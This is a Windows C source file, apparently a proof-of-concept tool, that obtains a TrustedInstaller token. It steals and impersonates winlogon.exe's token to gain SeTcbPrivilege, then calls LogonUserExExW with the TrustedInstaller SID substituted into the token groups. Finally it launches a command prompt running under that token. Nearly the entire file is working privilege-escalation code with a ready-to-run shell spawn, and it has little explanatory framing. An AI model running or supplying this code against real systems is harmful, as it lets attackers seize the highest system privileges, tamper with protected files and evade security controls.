
#include "Header.h"

int main()
{
   
	HANDLE trusted_installer_token = GetTrustedInstallerToken();
	if (!trusted_installer_token)
		return 1;

	printf("[+] Acquired TrustedInstaller Token\n");

	//At this point you can call ImpersonateLoggedOnUser(trusted_installer_token) and peform winapi calls with TrustedInstaller permissions.

	TestToken(trusted_installer_token);

	CloseHandle(trusted_installer_token);

	return 0;

}

HANDLE GetTrustedInstallerToken() {

	bool impersonating = false;
	HANDLE trusted_installer_token = NULL;

	ResolveDynamicFunctions();

	do {

		//TcbPrivilege is required to specify groups when calling LogonUserExExW

		if (!EnablePrivilege(false, SeTcbPrivilege)) {
			if (!EnablePrivilege(false, SeDebugPrivilege)) {
				printf("[-] The current process doesn't have SeTcbPrivilege or SeDebugPrivilege\n");
				break;
			}
			impersonating = ImpersonateTcbToken();
			if (!impersonating || !EnablePrivilege(impersonating, SeTcbPrivilege)) {
				printf("[-] Failed to acquire SeTcbPrivilege\n");
				break;
			}
		}

		PSID trusted_installer_sid;
		if (!ConvertStringSidToSidA("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &trusted_installer_sid)) {
			printf("[-] ConvertStringSidToSidA failed (%d)\n", GLE);
			break;
		}

		HANDLE current_token = impersonating ? GetCurrentThreadToken() : GetCurrentProcessToken();

		DWORD token_group_size;
		GetTokenInformation(current_token, TokenGroups, NULL, 0, &token_group_size);
		PTOKEN_GROUPS token_groups = (PTOKEN_GROUPS)LocalAlloc(LPTR, token_group_size);
		if (!token_groups) {
			printf("[-] LocalAlloc failed (%d)\n", GLE);
			break;
		}
		if (!GetTokenInformation(current_token, TokenGroups, token_groups, token_group_size, &token_group_size)) {
			printf("[-] GetTokenInformation failed (%d)\n", GLE);
			break;
		}

		//LogonUserExExW will fail if we don't replace the mandatory label with the trusted installer sid, didn't bother looking into why.
		//The new token has the proper mandatory label anyways after we create it
		token_groups->Groups[token_groups->GroupCount - 1].Sid = trusted_installer_sid;
		token_groups->Groups[token_groups->GroupCount - 1].Attributes = SE_GROUP_OWNER | SE_GROUP_ENABLED;

		bool logon_success = LogonUserExExW((LPWSTR)L"SYSTEM", (LPWSTR)L"NT AUTHORITY", NULL, LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_WINNT50, token_groups, &trusted_installer_token, NULL, NULL, NULL, NULL);

		if (!logon_success)
			printf("LogonUserExExW failed (error %d)\n", GLE);

	} while (false);

	if (impersonating)
		RevertToSelf();

	return trusted_installer_token;

}

bool ImpersonateTcbToken() {

	//Grabs a tcb token from WinLogon

	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hsnapshot == INVALID_HANDLE_VALUE) {
		printf("[-] CreateToolhelp32Snapshot failed (%d)\n", GLE);
		return false;
	}

	PROCESSENTRY32W entry = { 0 };
	entry.dwSize = sizeof(entry);

	if (!Process32FirstW(hsnapshot, &entry)) {
		CloseHandle(hsnapshot);
		printf("[-] Process32First failed (%d)\n", GLE);
		return false;
	}

	DWORD pid = 0;

	do {
		if (!_wcsicmp(L"winlogon.exe", entry.szExeFile)) {
			pid = entry.th32ProcessID;
			break;
		}
	} while (Process32NextW(hsnapshot, &entry));

	CloseHandle(hsnapshot);

	if (!pid) {
		printf("[-] Failed to find winlogon\n");
		return false;
	}

	HANDLE hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	if (!hprocess) {
		printf("[-] OpenProcess on pid %d failed (%d)\n", pid, GLE);
		return false;
	}

	HANDLE htoken;
	bool token_success = OpenProcessToken(hprocess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &htoken);

	CloseHandle(hprocess);

	if (!token_success) {
		printf("[-] OpenProcessToken failed (%d)\n", GLE);
		return false;
	}

	bool impersonate_success = ImpersonateLoggedOnUser(htoken);

	CloseHandle(htoken);

	if (!impersonate_success) {
		printf("[-] ImpersonateLoggedOnUser failed (%d)\n", GLE);
		return false;
	}

	return true;

}

bool EnablePrivilege(bool impersonating, int privilege_value)
{
	bool b;
	NTSTATUS status = RtlAdjustPrivilege(privilege_value, true, impersonating, &b);
	return NT_SUCCESS(status);
}

void ResolveDynamicFunctions()
{
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	HMODULE advapi32 = GetModuleHandleW(L"advapi32.dll");
	LogonUserExExW = (_LogonUserExExW)GetProcAddress(advapi32, "LogonUserExExW");
}

void TestToken(HANDLE token) {

	//This POC demonstrates the new permissions by kicking off a command prompt with the new token

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(si);
	si.lpDesktop = (LPWSTR)L"winsta0\\default";
	PROCESS_INFORMATION pi;

	EnablePrivilege(false, SeImpersonatePrivilege);

	wchar_t cmd_line[] = L"cmd.exe /k echo **TRUSTED INSTALLER COMMAND PROMPT** && whoami /groups";
	if (!CreateProcessWithTokenW(token, 0, NULL, cmd_line, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		printf("[-] CreateProcessWithTokenW failed (%d)\n", GLE);
		return;
	}

	printf("[+] New command prompt pid: %d\n", pi.dwProcessId);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

}
